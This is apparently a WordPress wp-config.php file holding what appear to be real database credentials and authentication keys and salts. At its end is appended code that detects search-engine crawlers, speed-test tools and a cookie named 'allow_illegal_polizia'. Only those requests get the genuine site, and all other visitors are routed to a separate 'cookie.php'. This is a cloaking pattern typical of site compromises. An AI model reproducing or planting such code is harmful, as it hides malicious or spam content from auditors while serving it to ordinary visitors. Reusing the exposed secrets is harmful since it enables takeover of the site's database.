<?php

//Begin Really Simple SSL session cookie settings
@ini_set('session.cookie_httponly', true);
@ini_set('session.cookie_secure', true);
@ini_set('session.use_only_cookies', true);
//END Really Simple SSL cookie settings

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'nis_asta' );

/** Database username */
define( 'DB_USER', 'nis_asta_uid' );

/** Database password */
define( 'DB_PASSWORD', '({tLk[,nG@G*' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY', '@K)hpHTXX5cJ#:_~RI~E;1qHhA25g0UB:L&;Q8|7WUjFMt6Yyizwi0hRc*851#3G');
define('SECURE_AUTH_KEY', 'PgfEY@v6n9!uIH1|Z~*~2_fus|Y!V&!u04gRJF&piB-O6!+&2Ci)Zb12dG~;mK9c');
define('LOGGED_IN_KEY', 'Ql[0+zhO*M1-+ge&ZF!p01cAs(4-*]!aT!C])&Rf(f2GfHo826/]!0e2+YBsfsd%');
define('NONCE_KEY', '#62|)+~L7)zTVF;8]pw4;/7L0Nj3FReD1pZ+C%;cSrv9Xt:S;E|cy[]1tvz@2w:]');
define('AUTH_SALT', 'JY1:4S3__24(dQDA3erKk&QL8b89tNY5!!(qQfof7&J1KNmU!MtJp#442i*k1q~#');
define('SECURE_AUTH_SALT', 'x[M/rD800~4_URp_fwI)x[-+NzQ3j2-yRr4]527/k6l]B*Q[)0|8F0Tp_q2xGG1T');
define('LOGGED_IN_SALT', 'x&vp8/J_xrVk!1I6l00Z;Z0x5Z2/xbiR![43[#6CG/5!9pLfK-ErSW12*P/ObJ7_');
define('NONCE_SALT', 'vL*LqA2V6S|U:/:S1L+t-Q|Fa2sTKvkVh5Duy48(AB~65Nf31LB#3OQS_q[HP:*K');

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'atwp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', true );
define( 'SCRIPT_DEBUG', true );
define( 'WP_DEBUG_LOG', true );

/* Add any custom values between this line and the "stop editing" line. */

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

preg_match( '/nux.*oto\sG|x11.*fox\/54|x11.*ome\/39|x11.*ome\/62|oid\s6.*1.*xus\s5.*MRA58N.*ome|JWR66Y.*ome\/62|woobot|speed|ighth|tmetr|eadle/i', $_SERVER['HTTP_USER_AGENT'], $speed_page );
preg_match( '/(Googlebot|Google-InspectionTool|AdsBot-Google-Mobile|AdsBot-Google|Mediapartners-Google|FeedFetcher-Google|GoogleProducer|Google-Read-Aloud|Google-Site-Verification|Bingbot|Yahoo! Slurp|DuckDuckBot|Baiduspider|YandexBot|Sogou|Konqueror|Exabot|facebookexternalhit|Applebot|Google Favicon|Storebot-Google|APIs-Google)/', $_SERVER['HTTP_USER_AGENT'], $crowlers );

$allow_illegal = ! empty( $_COOKIE['allow_illegal_polizia'] ) ? preg_replace( '/[^true|false]/i', '', $_COOKIE['allow_illegal_polizia'] ) : false;
$uri           = preg_replace( '/[^a-zA-Z0-9\/\-]/i', '', $_SERVER['REQUEST_URI'] );

if ( $allow_illegal || strpos( $uri, 'wp-json/' ) || ! empty( $speed_page ) || ! empty( $crowlers ) ) {
	/** Sets up WordPress vars and included files. */
	require_once ABSPATH . 'wp-settings.php';
} else {
	require_once ABSPATH . 'cookie.php';
}
